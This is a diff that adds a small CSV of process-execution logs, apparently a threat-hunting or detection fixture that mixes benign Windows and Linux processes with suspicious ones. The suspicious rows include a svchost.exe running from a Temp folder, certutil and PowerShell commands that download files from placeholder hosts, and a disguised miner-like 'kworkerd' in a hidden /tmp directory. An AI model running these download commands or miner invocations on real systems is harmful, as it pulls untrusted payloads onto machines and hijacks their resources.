@@ -1,0 +1,10 @@
+host,time,user,pid,ppid,image,command_line,sha256
+rcp-ws-14,2026-10-14T08:05:12Z,SYSTEM,812,640,C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k netsvcs -p,dff16aeebcb501bbf8007579dfa5e4672d226cfbdde90a6bf3c71f4cd723e36b
+rcp-ws-14,2026-10-14T08:44:51Z,s.moreau,6120,4388,C:\Users\s.moreau\AppData\Local\Temp\svchost.exe,C:\Users\s.moreau\AppData\Local\Temp\svchost.exe --sync telemetry-sync.example.net,D1421388E30984358E50CF78BE90DC21382412E414E71188B55542D6197F3F0B
+rcp-ws-22,2026-10-14T09:12:30Z,b.osei,7044,6980,C:\Windows\System32\certutil.exe,certutil.exe -urlcache -f http://cdn-update.example.net/a.txt C:\Users\Public\a.txt,908172dcb4d867aecf6e279ea6ce9a0e82c5c6456e5f65d6ce5477111f87778b
+rcp-ws-22,2026-10-14T09:13:02Z,b.osei,7102,6980,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,powershell.exe -NoProfile -Command Invoke-WebRequest -Uri https://203.0.113.77:8443/c -OutFile $env:TEMP\c.txt,a14923d268cf3255116fe7c0ff1d5096f99991d0d877b2b4a5a442f8405500e6
+kiosk-checkin2,2026-10-14T09:30:00Z,kiosk,2210,1980,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,powershell.exe -Command Test-NetConnection 203.0.113.70 -Port 443,a14923d268cf3255116fe7c0ff1d5096f99991d0d877b2b4a5a442f8405500e6
+xray-ws-31,2026-10-14T10:02:44Z,r.chen,5520,5100,C:\Program Files\FileSync\filesync.exe,"""C:\Program Files\FileSync\filesync.exe"" --server filesync.example.org",377dde22bd320af77cf8eb754bfc16813ac9658e5e4f2c5fdaf50596f56d6024
+xray-ws-31,2026-10-14T10:15:09Z,r.chen,5604,5100,C:\Windows\System32\cmd.exe,cmd.exe /c nslookup SYNC.EXAMPLE.ORG,0d7a00b6a84fcd17436c7ddf84cb5d3dcaa33ebf425dad48b9208711c2b0300d
+srv-booking,2026-10-14T11:20:00Z,www-data,27311,1184,/tmp/.X11-unix/.cache/kworkerd,/tmp/.X11-unix/.cache/kworkerd -o pool.example.net:443,b3bcdf55fa2ccd99e9ef8d4a0aa630afff573b1f665c402bcc395057fff7b014
+srv-booking,2026-10-14T11:21:00Z,root,1,0,/usr/lib/systemd/systemd,/sbin/init,8e81b68e0adfda5c6592711a2281431621478bff4c1d2008208608820800dc5c
